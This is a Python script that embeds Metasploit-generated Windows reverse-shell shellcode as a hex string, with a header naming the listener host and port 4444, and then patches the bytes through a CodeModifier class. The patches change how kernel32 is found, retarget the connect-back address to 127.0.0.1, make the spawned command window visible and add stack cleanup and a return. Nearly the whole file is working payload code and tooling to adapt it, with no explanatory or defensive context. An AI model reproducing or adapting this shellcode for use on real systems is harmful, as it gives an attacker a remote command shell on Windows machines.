
#/* win32_reverse -  EXITFUNC=thread LHOST=192.168.244.1 LPORT=4444 
# Size=287 Encoder=None http://metasploit.com */
connect_back_shellcode_original = \
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68" \
"\xc0\xa8\xf4\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9" \
"\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68" \
"\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3" \
"\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" \
"\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51" \
"\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6" \
"\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6" \
"\xff\x77\xfc\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0"

class CodeModifier:
    def __init__(self, code):
        self.code = code
        self.length = len(code)

    def print(self):
        str = ''.join([f"\\x{ord(k):02x}" for k in self.code])
        for k in range(0,len(str),64) :
            print(str[k:k+64])

    def basedlltokernel32(self):
        # ----- make eax point to kernel32.dll
        ind=self.code.find("\x8b\x40\x08")
        self.code = self.code[:ind]+"\x89\xC6\xad"+self.code[ind:]
        return self

    def sockaddrtolocal(self):
        # ----- modify sockaddr_in structure
        port = "\x11\x5c"
        # int.from_bytes(port.encode('latin-1'),byteorder='big')
        # int(''.join([f"{ord(k):02x}" for k in port]),16)
        addr = "\xc0\xa8\xf4\x01"
        # [k for k in  b"\xc0\xa8\xf4\x01"]
        host = [127,0,0,1]
        addr_new =''.join( chr(k) for k in host )
        self.code = self.code.replace(addr,addr_new)
        return self

    def windowstyletoshow(self):
        # --- modify STARTUPINFOA -> wShowWindow
        # STARTUPINFOA -> dwFlags(0x101) = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
        ind = self.code.find("\x8d\x7a\x38")
        # showwindow = 1
        self.code = self.code[:ind]+"\xfe\x42\x30"+self.code[ind:]
        return self
    
    def stackclean(self, iscallexit=True):
        # "\x55" push ebp  
        self.code = self.code[0] +"\x55"+ self.code[1:]
        callexitthread = self.code[-2:]
        # "\x83\xC4\x44\x83\xC4\x60" add    esp, 0xa4
        # "\x5D"                     pop    ebp
        self.code = self.code[:-2] +"\x83\xC4\x44\x83\xC4\x60\x5D"
        if iscallexit:
            # "\x50"                     push   eax
            self.code = self.code +"\x50"+ callexitthread

        # "\xC3" ret
        self.code = self.code + "\xC3"
        return self

cm = CodeModifier(connect_back_shellcode_original)
cm.basedlltokernel32().sockaddrtolocal().windowstyletoshow()
cm.stackclean(False)
shellcode = cm.code
# code.print()
